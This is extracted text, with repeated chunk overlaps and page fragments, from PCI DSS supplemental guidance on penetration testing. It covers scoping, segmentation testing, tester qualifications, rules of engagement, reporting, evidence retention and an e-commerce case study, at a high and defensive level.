follows: Vulnerability Scan Penetration Test Purpose Identify, rank, and report vulnerabilities that, if Identify ways to exploit vulnerabilities to exploited, may result in an intentional or circumvent or defeat the security features of unintentional compromise of a system. system components.

Information provided here does not 6\\nVulnerability Scan Penetration Test Reports Potential risks posed by known vulnerabilities, Description of each vulnerability verified and/or ranked in accordance with NVD/CVSS base potential issue discovered. More specific risks scores associated with each vulnerability. that vulnerability may pose, including specific methods how and to what extent it may be For PCI DSS, external vulnerability scans must exploited. Examples of vulnerabilities include but be performed by an ASV and the risks ranked in are not limited to SQL injection, privilege accordance with the CVSS. Internal vulnerability escalation, cross-site scripting, or deprecated scans may be performed by qualified personnel protocols. (does not require an ASV) and risks ranked in accordance with the organization’s risk-ranking process as defined in PCI DSS Requirement 6.1. An external vulnerability scan is conducted from outside the target organization. An internal vulnerability scan is conducted from inside the target organization. Duration Relatively short amount of time, typically several Engagements may last days or weeks seconds to several minutes per scanned host. depending on the scope of the test and size of the environment to be tested. Tests may grow in time and complexity if efforts uncover additional scope. 2.2 Scope PCI DSS defines the cardholder data environment (CDE) as “the people, processes, and technology that store, process, or transmit cardholder data or sensitive authentication data.” The scope of a penetration test, as defined in PCI DSS Requirement 11.3, includes the entire CDE perimeter and any critical systems. This applies both to the external perimeter (public-facing attack surfaces) and the internal perimeter of the CDE (LAN-LAN attack surfaces). The scope of testing may include locations of cardholder data, applications that store, process, or transmit cardholder data, critical network connections, access points, and other targets appropriate for the complexity and size of the organization. This should include resources and assets utilized by personnel to maintain systems in the CDE or to access cardholder data, as the compromise of such assets could allow an attacker to obtain credentials with access to or a route into the CDE. All penetration testing should only be conducted as defined by the rules of engagement agreed upon by both parties. See",

Information provided here does not 7\\n2.2.1 External Penetration Test The scope of an external penetration test is the exposed external perimeter of the CDE and critical systems connected or accessible to public network infrastructures. It should assess any unique access to the scope from the public networks, including services that have access restricted to individual external IP addresses. Testing must include both application-layer and network-layer assessments. External penetration tests also include remote access vectors such as dial-up and VPN connections. 2.2.2 Internal Penetration Test The scope of the internal penetration test is the internal perimeter of the CDE and critical systems from the perspective of the internal network. Testing must include both application-layer and network-layer assessments. Where the CDE is also the only internal network and there is no internal CDE perimeter, the scope of testing will typically be focused on critical systems. For example, testing activities may include attempting to bypass internal access controls intended to prevent unauthorized access or use of systems that store, process, or transmit CHD from those that do not. In cases where there is an internal CDE perimeter, the scope of testing will need to consider the CDE perimeter as well as critical systems within and outside of the CDE. For example, the testing may attempt to exploit permitted access paths from systems on an internal network segment into the CDE. When access to the CDE is obtained as a result of the testing, the scope of the penetration test may allow the tester to continue exploring inside the network and further the attack against other systems within the CDE, and may also include testing any data-exfiltration prevention (data-loss prevention) controls that are in place. In all cases, the scope of internal testing should consider the specific environment and the entity’s risk assessment. Entities are encouraged to consult with their assessor and the penetration tester to ensure the scope of the penetration test is sufficient and appropriate for their particular environment. 2.2.3 Testing Segmentation Controls The intent of segmentation is to prevent out-of-scope systems from being able to communicate with systems in the CDE or impact the security of the CDE. When properly implemented, a segmented (out-of- scope) system component could not impact the security of the CDE, even if an attacker obtained control of the out-of-scope system. If segmentation controls are implemented, testing of the controls is required to confirm that the segmentation methods are working as intended and that all out-of-scope systems and networks are isolated from systems in the CDE. The scope of segmentation testing should consider any networks and systems considered as being out of",

The intent of this document is to provide supplemental information. Information provided here does not 8\\n2.2.4 Critical Systems The term “critical systems” is used in PCI DSS to reference systems that are involved in the processing or protection of cardholder data. PCI DSS provides examples of critical systems that may be impacted by identified vulnerabilities including “security systems, public-facing devices and systems, databases, and other systems that store, process, or transmit cardholder data” (Requirement 6.1). However, for the purposes of a penetration test, there may be additional systems outside the CDE boundaries that could affect the security of the CDE. These systems should also be considered to be critical systems. Common examples of critical systems relevant to a penetration test might include: security systems (for example, firewalls, intrusion-detection systems/intrusion-prevention systems (IDS/IPS), authentication servers, e- commerce redirection servers, etc.), or any assets utilized by privileged users to support and manage the CDE. Please note that critical systems are defined by the entity, as each environment is different. 2.3 Application-Layer and Network-Layer Testing Any software written by or specifically for the organization that is part of the penetration test scope should be subject to both an application and network-layer penetration test. This assessment helps identify security defects that result from either insecure application design or configuration, or from employing insecure coding practices or security defects that may result from insecure implementation, configuration, usage, or maintenance of software. The remediation of vulnerabilities identified during an application-layer assessment may involve redesigning or rewriting insecure code. The remediation of vulnerabilities identified during a network-layer assessment typically involves either reconfiguring or updating software. In some instances, remediation may include deploying a secure alternative to insecure software. 2.3.1 Authentication If the application requires user authentication to the custom software, testing should be performed against all roles or types of access assumed by these parties. Also, testing should be performed against any role or access type that does not have explicit authorization to cardholder data to verify accounts without access cannot compromise such data. For customers running applications on multitenant servers that provide customers access to their cardholder data, authenticated testing should be performed to ensure customer access is properly restricted to only their own cardholder data. The customer should provide the penetration tester with credentials that have equivalent permission(s) as a customer user, to allow the penetration tester to determine whether those",

The customer should provide the penetration tester with credentials that have equivalent permission(s) as a customer user, to allow the penetration tester to determine whether those credentials allow access to data beyond the entity’s data. 2.3.2 PA-DSS Compliant Applications If a payment application has been PA-DSS validated, the application’s functionality does not need to be tested as part of the entity’s PCI DSS compliance validation. However, the implementation of the application does need to be tested. This includes both the operating system and any exposed services, but not the payment application’s functionality (e.g., authentication, key management, transaction processing, etc.) since this was validated as part of the PA-DSS application validation. The intent of this document is to provide supplemental information. Information provided here does not 9\\n2.3.3 Web Applications It is common for an environment to host a web application that was not specifically coded for the organization such as commercial, off-the-shelf web-mail interfaces, document-sharing tools, file-transfer services, network-device administrative interfaces, etc. In these instances, the web application does not typically need an application-layer penetration test as the entity is not responsible for the source code of this type of software. Instead, the tester should perform a network-layer test and ensure the software was implemented, configured, and is currently being maintained in a secure manner (disabling or uninstalling unused services, blocking unused ports, applying current updates, etc.). 2.3.4 Separate Testing Environment Because of the nature and the intent of penetration testing, such testing in a production environment during normal business hours may impact business operations, and attempts to avoid disruption may increase the time, resources and complexity of the testing. This is especially important for high availability systems that may be impacted by penetration testing in a production environment. To avoid disruptions and to speed up testing, a separate environment that is identical to the production environment may be used for testing instead of the production environment. The penetration tester would need to ensure the same application and network-layer controls as production exist in the testing environment. This may be accomplished through methods to map out the production environment to verify it matches the testing environment. This should be included in the rules of engagement. All exploitable vulnerabilities identified during the testing must be corrected on production systems and testing repeated to verify that security weaknesses have been addressed. 2.4 Segmentation Checks PCI DSS Requirement 11.3.4 requires penetration testing to validate that segmentation controls and methods are operational, effective, and isolate all out-of-scope systems from systems in the CDE. Therefore, a robust approach to penetration testing is recommended to satisfy this requirement by actively attempting to identify routes and paths from networks outside the CDE into the CDE. All segmentation methods need to be specifically tested. In very large networks, with numerous internal LAN segments, it may be infeasible for the penetration tester to conduct specific tests",

All segmentation methods need to be specifically tested. In very large networks, with numerous internal LAN segments, it may be infeasible for the penetration tester to conduct specific tests from every individual LAN segment. In this case, the testing needs to be planned to examine each type of segmentation methodology in use (i.e., firewall, VLAN ACL, etc.) in order to validate the effectiveness of the segmentation controls. The level of testing for each segmentation methodology should provide assurance that the methodology is effective in all instances of use. In order to effectively validate the segmentation methodologies, it is expected that the penetration tester has worked with the organization (or the organization’s QSA) to clearly understand all methodologies in use in order to provide complete coverage when testing. The penetration tester may choose to include systems located in these isolated LAN segments not directly related to the processing, transmission, or storage of cardholder data to ensure these systems could not impact the security of the CDE if compromised. See Section 4.2.3 for specific guidance on testing methodologies for validating segmentation controls. The intent of this document is to provide supplemental information. Information provided here does not 10\\n2.5 Social Engineering Social engineering is the attempt to gain information, access, or introduce unauthorized software into the environment through the manipulation of end users. PCI DSS reconfirms testing by requiring industry accepted penetration-testing approaches (many of which include social engineering as part of their approach) and to have an approach to penetration testing that \"considers the threats and vulnerabilities experienced by merchants in the last 12 months.\" This may include social-engineering attacks as a method used for introducing malware into the environment. Social-engineering tests are an effective method of identifying risks associated with end users’ failure to follow documented policies and procedures. There is no blanket approach to social-engineering engagements. If an organization chooses to include social-engineering testing as part of its annual security review, the tests performed should be appropriate for the size and complexity of the organization and should consider the maturity of the organization’s security awareness program. These tests might include in-person, non- technological interactions such as persuading someone to hold open a door, remote interactions such as having someone provide or reset a password, or convincing the end user to open a vulnerable e-mail attachment or hyperlink. While PCI DSS does not require testing to include social-engineering techniques, an entity can incorporate it into its penetration testing methodology as an ongoing method to determine the effectiveness of the security awareness program. The frequency of social-engineering tests would be determined by the entity when establishing its security awareness program. End-user security awareness re-education might be sufficient remediation for users who fail a social-engineering test. The objective is that, over time, fewer and fewer employees are making poor decisions that could allow an attacker to compromise security. Additional guidance on establishing",

The objective is that, over time, fewer and fewer employees are making poor decisions that could allow an attacker to compromise security. Additional guidance on establishing an effective and robust security awareness program can be found in the Document Library on the PCI SSC website. Social-engineering testing may not be appropriate or provide a meaningful result for all organizations. Although social-engineering testing is not a requirement of PCI DSS, an organization may consider documenting the reason(s) for foregoing social-engineering testing and include applicable documentation with the internal and external penetration test reports, particularly if social-engineering attacks were encountered in the last 12 months. 2.6 What is considered a “significant change”? Per PCI DSS Requirements 11.3.1 and 11.3.2, penetration testing must be performed at least annually and after any significant change—for example, infrastructure or application upgrade or modification—or new system component installations. What is deemed “significant” is highly dependent an entity’s risk- assessment process and on the configuration of a given environment. Because of this variability, a significant change is not prescribed by PCI DSS. If the change could impact the security of the network or allow access to cardholder data, it may be considered significant by the entity. Penetration testing of significant changes is performed to ensure that controls assumed to be in place are still working effectively after the upgrade or modification. The intent of this document is to provide supplemental information. Information provided here does not 11\\n3 Qualifications of a Penetration Tester Qualified internal resources or a qualified third party may perform the penetration test as long as they are organizationally independent. This means the penetration tester must be organizationally separate from the management of the target systems. For example, in situations where a third-party company is performing the PCI DSS assessment for the entity, that party cannot perform the penetration test if they were involved in the installation, maintenance, or support of target systems. The following guidelines may be useful when selecting a penetration tester (or team) to understand their qualifications to perform penetration testing. 3.1 Certifications Certifications held by a penetration tester may be an indication of the skill level and competence of a potential penetration tester or company. While these are not required certifications, they can indicate a common body of knowledge held by the candidate. The following are some examples of common penetration testing certifications:  Offensive Security Certified Professional (OSCP)  Certified Ethical Hacker (CEH)  Global Information Assurance Certification (GIAC) Certifications (e.g., GIAC Certified Penetration Tester (GPEN), GIAC Web Application Penetration Tester (GWAPT), or GIAC Exploit Researcher and Advanced Penetration Tester (GXPN))  CREST Penetration Testing Certifications  Communication Electronic Security Group (CESG) IT Health Check Service (CHECK) certification Note: The PCI SSC does not validate or endorse these certifications. 3.2 Past Experience Appropriate penetration testing experience and qualifications cannot be met by certifications alone.

Therefore, confirmation of additional criteria is necessary. For example, review of the extent of actual engagements that have been performed and relevant work experience are important considerations when selecting a penetration tester or team. The following questions are examples for assessing the qualifications and competency of a penetration tester or team. This is not an exhaustive list: Q How many years’ experience does the penetration tester have? • If the penetration tester is in their first year of penetration testing, careful consideration should be given to the following questions to ensure the penetration tester has sufficient knowledge and is adequately trained to perform the penetration test. Consideration should also be given to the organization itself by verifying the training and QA processes to ensure penetration tester is qualified. The intent of this document is to provide supplemental information. Information provided here does not 12\\nQ How many years has the organization that employs the penetration tester been performing penetration tests? • References from other customers may be useful in consideration. Q Has the penetration tester performed assessments against organizations of similar size and scope? • For environments with high availability constraints, unstable system components, or large infrastructures, it is important to evaluate a tester’s ability to handle those restrictions (bandwidth constraints, time constraints, etc.). Q What penetration testing experience has the penetration tester or team had with the technologies in the target environment (i.e., operating systems, hardware, web applications, highly customized applications, network services, protocols, etc.)? • When selecting a penetration tester, it is important to evaluate the past testing experience of the organization for which the tester works as it pertains to technologies specifically deployed within the target environment. • Even if the penetration tester has not performed an assessment against certain specific technologies, if the tester has managed, maintained, been trained on, or developed said technologies, the tester may still be qualified to perform the penetration test. Q Consider what other skills/qualifications the penetration tester has that will contribute to their ability to assess the environment. • Are there industry-standard penetration testing certifications held by the penetration tester? (See Section 3.1.) • What type of experience does the penetration tester have conducting network-layer penetration testing? Discussion of examples of network penetration testing efforts conducted by the organization may be warranted. • Does the penetration tester have experience conducting application-layer penetration testing? Discussion of the penetration tester’s familiarity with testing to validate the OWASP Top 10 and other similar application secure-coding standards and examples of application penetration testing efforts conducted by the organization may be warranted.

This section provides guidance for these activities and is organized by the typical phases that occur during a penetration test: pre-engagement, engagement, and post-engagement. 4.1 Pre-Engagement Before the engagement or testing begins, it is recommended that all parties involved (the organization, the tester, and where applicable, the assessor) be informed of the types of testing (i.e., internal, external, application-layer or network-layer) to be performed, how testing will be performed, and what the testing will target. By coordinating these details first, issues where the CDE scope is defined improperly or other issues arise that would require a retest might be avoided. This information may be gathered by conducting a pre- engagement call or during an on-site pre-engagement meeting. 4.1.1 Scoping The organization being assessed is responsible for defining the CDE and any critical systems. It is recommended that the organization work with the tester and, where applicable, the assessor to verify that no components are overlooked and to determine whether any additional systems should be included in scope. The scope of the penetration test should be representative of all access points, critical systems, and segmentation methodologies for the CDE. 4.1.2 Documentation Whenever possible, detailed documentation of any components within the scope should be made available to the tester. Common examples of such documents are application-interface documentation and implementation guides. This information will ensure the tester understands how functionality should work and whether results received are expected for the given scenario. As a part of the scoping process, the organization should consider supplying the tester with the following documentation:  A network diagram depicting all network segments in scope for the test (Refer to PCI DSS Requirements 1.1.2 and 1.1.3.)  Cardholder data flow diagram  A list of all expected services and ports exposed at the CDE perimeter  Details of how authorized users access the CDE  A list of all network segments that have been isolated from the CDE to reduce scope The penetration tester will use this information during the assessment to identify unexpected attack vectors of the CDE in addition to known attack vectors, insufficient authentication controls, and to confirm the proper segmentation of out-of-scope environments.

This authorizes the tester to test the environment and ensure the organization understands what to expect from the penetration test. Below are some examples of considerations that may be included in the rules of engagement:  During what time window will testing need to be performed?  Are there any legacy systems that have known issues with automated scanning? If so, how should testing be performed against these systems?  Is there a preferred method of communicating about scope and issues encountered during the engagement?  Does the entity want updates regarding ongoing exploitation of systems during the test? If so, the entity will need to determine whether they will or will not act upon such information or make changes to the environment. The entity may also want to implement its incident response plan in response to an exploit.  Are there security controls that would detect or prevent testing? Consider whether these should be disabled or configured to not interfere during testing. (See Section 4.1.7 for further guidance.)  If passwords or other sensitive data are compromised during the testing, does the tester need to disclose a list of all passwords and/or sensitive data accessed?  If equipment owned by the tester is to be connected to the organization’s network, what steps must be taken to ensure the equipment does not pose a threat to the environment (updated to the latest operating system, applied service packs and/or patches, etc.)?  Does the tester need to provide all IP addresses from which testing will originate?  Will sensitive data shown to be accessible during the test be retained by the tester during and after the penetration test? Only a proof-of-concept test should be performed, any cardholder data obtained must be secured in accordance with PCI DSS. (See Section 4.2.4 for more guidance.)  What steps will be taken if the tester detects a previous or active compromise to systems being tested? (For example, activate incident response procedures and stop penetration test until resolution of the compromise situation.) The intent of this document is to provide supplemental information.

The scope may include any systems managed, built, or",

The scope may include any systems managed, built, or utilized by the organization.  Unless otherwise noted in the scope, web-management portals provided by the third party for the entity to manage its infrastructure should not be included in the penetration test—these interfaces should be tested and validated as part of the third party’s PCI DSS compliance efforts, and evidence or attestation of validation should be provided to the customer. 4.1.5 Success Criteria The intent of a penetration test is to simulate a real-world attack situation with a goal of identifying how far an attacker may be able to penetrate into the environment. Defining the success criteria for the penetration test allows the entity to set limits on the depth of the penetration test. Without agreeing upon the point at which the penetration test is complete, there is a possibility of the tester exceeding the boundaries and expectations of the target entity. This should be documented in the rules of engagement. Possible success criteria may include:  Direct observation of restricted services or data in the absence of expected access controls  Compromise of an intermediary device used by privileged users to access the CDE  Compromise of the domain used by privileged users  No compromise of the target systems The success criteria will be different for every environment and should be established during initial pre- engagement meeting prior to testing. 4.1.6 Review of Past Threats and Vulnerabilities PCI DSS Requirement 11.3 requires a review and consideration of threats and vulnerabilities encountered by the assessed entity within the past 12 months. This is an historical look at real vulnerabilities experienced or discovered in the entity’s environment since the last assessment. This information may provide insight to the process in place to handle these vulnerabilities. The intent of this document is to provide supplemental information. Information provided here does not 16\\nThe penetration tester should be familiar with current vulnerabilities seen by the industry over the past 12 months as well as take a detailed look at recent vulnerabilities experienced by the entity. Depending on the type of test to be performed (i.e., white box, grey box, black box), the following may or may not be considered in such a review:  Vulnerabilities discovered by the entity which have not been remediated within the time period required by PCI DSS (example: quarterly), and/or by the vulnerability remediation requirements documented in the corporate security policy  Existing compensating controls mitigating the noted vulnerabilities  Deployments or upgrades in progress (consider both hardware and software)  If applicable, threats or vulnerabilities that may have led to a data breach  Validation of the remediation of previous years’ penetration test findings  Identification of industry “state of existing vulnerabilities” for purposes of tracking",

In many environments, active protection controls such as an intrusion prevention system or web active protection systems such as intrusion protection systems (IPS) and web application firewalls (WAF) may be deployed to protect exposed services. Because the intent of the penetration test is to evaluate the services’ susceptibility to exploitation (vs. the active protection systems’ ability to prevent attacks), interference with the penetration test should be avoided—entities are encouraged to review and be familiar with the section titled “Scan Interference” in the ASV Program Guide and configure active protection systems accordingly during testing. This practice helps ensure that the services themselves are configured properly and have the minimal risk of being exploited in the event the active protection system fails or is somehow defeated or bypassed by an attacker. 4.2 Engagement: Penetration Testing Each environment has unique aspects/technology that requires the tester select the most appropriate approach and the tools necessary to perform the penetration test. It is beyond the scope of this document to define or outline which approach, tools, or techniques are appropriate for each penetration test. Instead, the following sections provide high-level guidance on considerations for the approach, tools, or techniques. The intent of this document is to provide supplemental information. Information provided here does not 17\\nPenetration testing is essentially a manual endeavor. In many cases, tools exist that can aid the tester in performing the test and alleviate some of the repetitive tasks. Judgment is required in selecting the appropriate tools and in identifying attack vectors that typically cannot be identified through automated means. Penetration testing should also be performed from a suitable location, with no restrictions on ports or services by the Internet provider. For example, a penetration tester utilizing Internet connectivity provided to consumers and residences may have SMTP, SNMP, SMB, and other ports restricted by the Internet provider to minimize impact by viruses and malware. If testing is performed by a qualified internal resource, the test should also be performed from a neutral Internet connection unaffected by access controls that might be present from the corporate or support environments. 4.2.1 Application Layer As mentioned in Section 2.3, the penetration tester should perform testing from the perspective of the defined roles of the application. The organization is strongly encouraged to supply credentials to allow the tester to assume the required roles. This will",

    "text": "present from the corporate or support environments. 4.2.1 Application Layer As mentioned in Section 2.3, the penetration tester should perform testing from the perspective of the defined roles of the application. The organization is strongly encouraged to supply credentials to allow the tester to assume the required roles. This will allow the tester to determine if, at any given role, the user could escalate privileges or otherwise gain access to data they are not explicitly allowed to access. In instances where the organization has created new accounts for the tester to use, it is important that the organization ensure all roles and applicable security in the application have been set up to allow the tester to effectively test all functionality. In instances where a web application utilizes a back-end API, the API may be in scope for the testing. The tester should understand the interaction between the web application and the backend, the functionality exposed by the API, as well as any security controls implemented to protect access to the API. Those, and other factors, will help determine whether the back-end API should be tested independently from the web application. 4.2.2 Network Layer Since most protocols are well defined and have standard modes of interaction, network-layer testing is more suitable for automated testing. This makes automation the first logical step in a network-layer test. Because of such standardization, tools may be used to quickly identify a service, the version of the software, test for common misconfigurations, and even identify vulnerabilities. Automated tests can be performed much faster than could be expected of a human. However, simply running an automated tool does not satisfy the penetration testing requirement. Automated tools cannot interpret vulnerabilities, misconfigurations, or even the services exposed to assess the true risk to the environment. The automated tool only serves as a baseline indication of the potential attack surface of the environment. The penetration tester must interpret the results of any automated tools and determine whether additional testing is needed. Using the documentation provided by the organization during the pre-engagement, the tester should:  Verify that only authorized services are exposed at the CDE perimeter.  Attempt to bypass authentication controls from all network segments where authorized users access the CDE, as well as segments not authorized to access the CDE. The intent of this document is to provide supplemental information. Information provided here does not 18\\n4.2.3 Segmentation The segmentation check is performed by conducting tests used in the initial stages of a network penetration test (i.e., host discovery, port scanning, etc.). It should verify that all out-of-scope LANs truly have no access to the CDE. For environments with a large number of network segments considered to be out of scope or isolated from the CDE, a representative subset can be used for testing to reduce the number of segmentation checks that need to be performed. Each unique segmentation methodology should be tested to ensure that all security controls are functioning as intended. If it is determined during the",

Each unique segmentation methodology should be tested to ensure that all security controls are functioning as intended. If it is determined during the segmentation check that a LAN segment thought to be out of scope has access into the CDE, the organization will either need to adjust the segmentation controls to block that access, or perform a full network-layer penetration test to characterize the access and the impact on PCI DSS scope. 4.2.4 What to do when cardholder data is encountered If cardholder data is accessed during the penetration test, it is important that the tester notify the organization immediately. The tester should keep detailed documentation as to exactly what data was accessed and how it was accessed. After being notified, the organization should immediately review how the cardholder data was retrieved and, as appropriate, should take steps to execute its incident response plan. If the output of testing tools or activities includes cardholder data that was accessed by the tester during the engagement, it is important this output be secured in accordance with PCI DSS. 4.2.5 Post-Exploitation The term “post-exploitation” refers to the actions taken after the initial compromise of a system or device. It often describes the methodical approach of using privilege escalation or pivoting techniques—which allows the tester, in this case, to establish a new source of attack from the new vantage point in the system—to gain additional access to systems or network resources. Penetration testers should be able to demonstrate the risk presented by exploitable systems to the CDE and what post-exploitation may likely occur with those systems. 4.3 Post-Engagement After the engagement or testing has been performed, there are activities both parties should carry out. 4.3.1 Remediation Best Practices Penetration testing efforts, while thorough, may not always guarantee exhaustive identification of every instance where a security control’s effectiveness is insufficient—e.g., finding a cross site scripting vulnerability in one area of an application may not reveal all instances of this vulnerability in the application. Often the presence of vulnerability in one area may indicate weakness in process or development practices that could have replicated or enabled similar vulnerability in other locations. Therefore, it is important for the tested entity to carefully investigate systems or applications with the ineffective security controls in mind when remediating. The intent of this document is to provide supplemental information. Information provided here does not 19\\n4.3.2 Retesting Identified Vulnerabilities The organization should take steps to remediate any exploitable vulnerability within a reasonable period of time after the original test. When the organization has completed these steps, the tester should perform a retest to validate the newly implemented controls mitigate the original risk. Remediation efforts extending for a long period after the initial test may require a new testing engagement to be performed to ensure accurate results of the most current environment are reported.

This determination may be made after a risk analysis of how much change has occurred since the original testing was completed. In specific conditions, the flagged security issue may represent a fundamental flaw in an environment or application. The scope of a retest should consider whether any changes occurring as a result of remediation identified from the test are classified as significant. All changes should be retested; however, whether a complete system retest is necessary will be determined by the risk assessment of those changes. 4.3.3 Cleaning up the Environment It is important for the tester to document and disclose to the organization any alterations made to the environment (as permitted in the Rules of Engagement) during the test, including but not limited to:  Accounts that were created as a part of the assessment either by the entity or the tester: the organization should then remove these accounts.  Tools installed by the tester on the organization’s systems: these tools should be removed at the end of the testing. Removal of accounts and test tools will ensure the accounts or remnant tools could not be exploited or used against the organization. 4.4 Additional Resources There are multiple industry-accepted methodologies that may provide additional guidance on penetration testing activities, including but not limited to:  Open Source Security Testing Methodology Manual (“OSSTMM”)  The National Institute of Standards and Technology (“NIST”) Special Publication 800-115  OWASP Testing Guide  Penetration Testing Execution Standard  Penetration Testing Framework The intent of this document is to provide supplemental information. Information provided here does not 20\\n5 Reporting and Documentation The purpose of the report is to assist the organization in its efforts to improve its security posture by identifying areas of potential risk that may need to be remediated. Merely reporting lists of vulnerabilities is not helpful in this endeavor and does not meet the intent of the penetration test. The report should be structured in a way to clearly communicate what was tested, how it was tested, and the results of the testing. This section provides guidance on documenting identified and/or exploited vulnerabilities, creating reporting templates, and evaluating a penetration test report. 5.1 Identified Vulnerability Reporting Penetration test reports should include a discussion of the steps, vectors, and exploited vulnerabilities that lead to penetration during testing for which remediation and retesting are required. However, it is possible for the tester to identify vulnerabilities that were not necessarily exploitable but which are deemed to pose a potential risk to the environment. It is recommended that the report contain any findings that impact the security posture of the assessed entity even in cases where exploitation did not occur. Some examples of identified vulnerabilities that were not",

It is recommended that the report contain any findings that impact the security posture of the assessed entity even in cases where exploitation did not occur. Some examples of identified vulnerabilities that were not exploited for valid reasons and should be included in the report may be:  Firewall misconfigurations that permit unauthorized traffic between secure and insecure zones  Detection of credentials obtained through manipulation of a web-application error message that was not flagged during an ASV scan due to a low CVSS base score 5.1.1 Assigning a Severity Score In order to prioritize remediation of the penetration test findings, it is a common practice during the reporting phase for a severity or risk ranking to be assigned for each detected security issue. The report should clearly document how the severity/risk ranking is derived. In most cases, severity/risk ranking may be applied as a result of evaluating an industry-standard score (e.g., NVD, CVSS) against a threshold or value that indicates risk (i.e., high, medium, and low). However, it should be noted that it is possible for a vulnerability to exist that is inherent to a particular environment; therefore, a standardized score is not available. When custom scoring is part of the risk-ranking process, the report should reflect a traceable set of reasoning for the modification of industry-standard scores or, where applicable, for the creation of a score for a vulnerability that does not have an industry-standard score defined. The intent of this document is to provide supplemental information. Information provided here does not 21\\n5.1.2 Industry Standard References Some well-known, industry-standard references include:  National Vulnerability Database (NVD)  Common Vulnerability Scoring System (CVSS)  Common Vulnerabilities and Exposure (CVE)  Common Weakness Enumeration (CWE)  Bugtraq ID (BID)  Open Source Vulnerability Database (OSVDB) The Common Vulnerability Scoring System (CVSS) is an example of an open framework that may be referenced for assigning a baseline risk rating. The CVSS is the required scoring system for Approved Scanning Vendors (ASVs) to use for ranking vulnerabilities detected during PCI vulnerability scans. Using this system, a standardized vulnerability score can be adjusted through the evaluation of the traits of vulnerability within the context of a specific environment. 5.2 Reporting Guidelines Comprehensive and consistent reporting is a critical phase of a penetration test. This section provides guidelines on common contents of an industry standard penetration test. It should be noted that these are only suggested outlines and do not define specific reporting requirements for PCI DSS penetration tests. Testers may have different sections, alternative titles, and/or report format, etc.; this outline represents data gathered from a number of penetration testing providers and the desires of customers. 5.2.1 Penetration Test Report Outline  Executive Summary Brief high-level summary of the penetration test scope and major findings o  Statement of Scope A detailed definition of the scope of the network and systems tested as part of o the",

Provide directions on how cleanup should be performed and how to verify security o controls have been restored. 5.2.2 Retesting Considerations and Report Outline If the noted findings will require remediation and retesting before an assessor can determine the entity has met PCI DSS Requirement 11.3, a follow-up test report may be provided. All remediation efforts should be completed and retested within a reasonable period of time after the original penetration test report was provided. It is expected that the remediation test report will cover all identified/exploitable vulnerabilities that require remediation.

A typical penetration test involves obtaining and evaluating evidence using a formal methodology; evidence collected from the penetration test is used to determine the conclusion. Evidence is considered all information that supports the penetration tester’s conclusions about the effectiveness of the security controls and the environment’s overall security posture. The penetration tester should follow a systematic process to securely collect, handle, and store evidence. Examples of evidence include but are not limited to screenshots, raw tool output (i.e., NMAP, burp suite, Nessus, TCPDump Wireshark, etc.), acquired dumps in case of exploitation (i.e., database files, logs, configuration files etc.), photos, recordings, and anything that may support the final conclusion of the penetration test report. It should be noted that if cardholder data is acquired during the penetration test, it is recommended that it be kept to a minimum. For example, a database full of cardholder data should not be dumped to the tester’s machine or system. 5.3.2 Retention It is recommended that procedures for retention and destruction of evidence be documented for all parties involved prior to commencing the penetration test. If a third party is used to perform the penetration test, contract language should be reviewed to confirm these procedures are clear. While there are currently no PCI DSS requirements regarding the retention of evidence collected by the penetration tester, it is a recommended best practice that such evidence be retained by the tester (whether internal to the organization or a third-party provider) for a period of time while considering any local, regional, or company laws that must be followed for the retention of evidence. This evidence should be available upon request from the target entity or other authorized entities as defined in the rules of engagement. If, however, a tester stores cardholder data obtained during the engagement, the data must be stored by the tester following the guidelines of the PCI DSS for the storage of account data—i.e., encrypted using strong cryptography, truncated/hashed, or not stored. Storage of account data by the tester is not recommended. This data should be securely wiped from tester systems at the conclusion of the engagement.

Client has three unique brands running on multiple e-commerce web sites. Brand A runs on a third-party e-commerce platform written using a Java platform with Apache Tomcat and IBM’s DB2 database and utilizes a content-delivery network for image distribution. Brand B and Brand C utilize an in-house coded e-commerce shopping cart written in ColdFusion with Microsoft SQL and share the same underlying code. All brands submit cardholder data for processing over HTTPS. All sites are hosted at a third-party hosting provider on dedicated systems. The Client’s firewalls have integrated intrusion prevention features. Client has exclusive control of the code and the content. Product Managers update product information using staging servers in the corporate environment, and the updates are promoted to production by IT support staff. Client has full control of DNS. Description of Environment The environment for Brands A, B, and C is comprised of five networks. The web DMZ contains the firewalls, DNS servers, load balancers, and web servers for all brands. Only the load balancers are NAT’d and have publicly routable IP addresses. The application tier contains the Apache Tomcat and ColdFusion middleware servers. It is segmented from the DMZ and database tiers using firewall access controls. The database tier contains the Microsoft SQL and IBM DB2 servers. It is segmented from the application tier using firewall access controls. The management network is used for backups, patch-management servers, NTP Servers, network-traffic analysis devices, and syslog collectors. The management network is accessible using jump boxes with two-factor authentication from the corporate network over a point-to-point VPN. Pre-Engagement Activities (Planning) Once the engagement is confirmed, the Pen Test Company scheduled a kick-off call and provided the Client with a testing questionnaire and test-authorization form to be completed before the next meeting. The kick-off call is generally used to review the rules of engagement, define the success criteria, and review the methodology to be used. An examination of this type could be conducted in accordance with information system security assessment best practices such as described by the Open Source Security Testing Methodology Manual (“OSSTMM”), The National Institute of Standards and Technology (“NIST”) Special Publication 800-115, Technical Guide to Information Security Testing and Assessment, or the Open Web Application Security Project (OWASP) testing methodology as defined in the OWASP Testing Guide v.3.0.

In this case, all external IPs used for the DMZ and web tier were included in the scope. This would include all systems that directly store, process, or transmit cardholder data. Because the Client has full control and full responsibility for its security, the DNS server was included in the scope of the test to determine whether an attacker could compromise the server and redirect traffic intended for the Client’s sites to a malicious intermediary or fraudulent site. The image CDN servers were determined out of scope because no PAN data is transmitted or processed and the systems are otherwise fully segmented. The staging systems are unavailable from the Internet and therefore cannot be tested. The web applications for Brand A and Brand B will be completely in scope. The web application for Brand C is presumed to be an exact copy, exclusive of product information and look and feel. The tester will sample the web application for Brand C to verify that the applications are the same as Brand B. If it is determined that there are material differences between Brand B and Brand C web applications, Brand C will be brought fully into scope. The Client and Pen Test Company have agreed that testing will be conducted against the production systems, as no suitable staging or review system is publicly available. Because of this limitation, testing must be performed with the intrusion prevention system enabled. However, because the timeline for testing cannot accommodate the time required to use techniques that might bypass the IPS, the Client has agreed to remove any blocks enabled by the system during testing. For this engagement the Client has requested that additional rules of engagement include that testing be limited to non-peak hours, and any attempts to run exploit code on the remote systems be performed only after notifying the Client. Also, any accounts created by the tester or successful orders placed in the system must be identified at the end of each day’s testing. All parties have agreed that no further testing is required if the penetration tester is able to extract data from either of the databases or obtain shell access on any server in the web farm. Engagement Phase (Discovery and Attack/Execution) The penetration tester began by comparing the scope provided by the Client with the latest ASV report to ensure they agreed on the assets and targets under examination. Any differences in scope were noted and investigated. The penetration tester then gathered information on the target organization through web sites and mail servers, public records, and databases.

